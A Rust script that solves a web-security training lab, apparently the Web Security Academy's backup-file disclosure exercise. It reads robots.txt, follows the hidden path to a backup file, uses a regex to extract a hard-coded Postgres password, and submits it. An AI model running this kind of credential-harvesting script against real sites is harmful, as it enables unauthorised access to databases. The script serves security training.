/*************************************************
*
* Lab: Source code disclosure via backup files
*
* Hack Steps: 
*      1. Fetch the robots.txt file
*      2. Search for hidden paths
*      3. Fetch the hidden path
*      4. Extract the path to the backup file
*      5. Fetch the backup file
*      6. Extract key
*      7. Submitt the solution
*
**************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0ab3005c03638eae8155759f0000007e.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Fetching the robots.txt file.. ");
    flush_terminal();

    let robots = fetch("/robots.txt");

    println!("{}", "OK".green());
    print!("⦗2⦘ Searching for hidden paths.. ");
    flush_terminal();

    let mut body = robots.text().unwrap();
    let hidden_path = capture_pattern_from_text("Disallow: (.*)", &body);

    println!("{} => {}", "OK".green(), hidden_path.yellow());
    print!("⦗3⦘ Fetching the hidden path.. ");
    flush_terminal();

    let backup_dir = fetch(&hidden_path);

    println!("{}", "OK".green());
    print!("⦗4⦘ Extracting the path to the backup file.. ");
    flush_terminal();

    body = backup_dir.text().unwrap();
    let backup_file_path = capture_pattern_from_text("href='(.*)'>", &body);

    println!("{} => {}", "OK".green(), backup_file_path.yellow());
    print!("⦗5⦘ Fetching the backup file.. ");
    flush_terminal();

    let backup_file = fetch(&backup_file_path);

    println!("{}", "OK".green());
    print!("⦗6⦘ Extracting key.. ");
    flush_terminal();

    body = backup_file.text().unwrap();
    let key = capture_pattern_from_text(r#"\"postgres\",\s*\"postgres\",\s*\"(.*)\""#, &body);

    println!("{}", "OK".green());
    print!("⦗7⦘ Submitting the solution.. ");
    flush_terminal();

    submit_solution(&key);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn submit_solution(answer: &str) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/submitSolution"))
        .form(&HashMap::from([("answer", answer)]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to submit the solution".red()));
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
